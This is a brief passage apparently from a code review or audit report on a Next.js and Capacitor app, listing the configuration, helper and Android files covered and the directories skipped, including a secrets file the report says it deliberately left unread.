- **Config, Helpers & Mobile:** [next.config.ts](file:///c:/Users/new/akshara%20app/next.config.ts), [package.json](file:///c:/Users/new/akshara%20app/package.json), [.gitignore](file:///c:/Users/new/akshara%20app/.gitignore), [.env.example](file:///c:/Users/new/akshara%20app/.env.example), [capacitor.config.ts](file:///c:/Users/new/akshara%20app/capacitor.config.ts), [android/app/src/main/AndroidManifest.xml](file:///c:/Users/new/akshara%20app/android/app/src/main/AndroidManifest.xml), [android/app/src/main/java/com/akshara/academy/MainActivity.java](file:///c:/Users/new/akshara%20app/android/app/src/main/java/com/akshara/academy/MainActivity.java), [src/lib/formatters.ts](file:///c:/Users/new/akshara%20app/src/lib/formatters.ts), [src/lib/receipt-image.tsx](file:///c:/Users/new/akshara%20app/src/lib/receipt-image.tsx), [src/types/database.ts](file:///c:/Users/new/akshara%20app/src/types/database.ts)

### Skipped Files / Directories
- `node_modules/`, `.next/`, `android/build/`, `android/app/build/` (third-party dependencies and build output)
- Purely presentational shadcn/ui primitives in `src/components/ui/*` (contain no auth, network, or state logic)
- `.env.local` (intentionally not printed or read into the report to strictly honor Rule #2 and prevent any secret exposure)

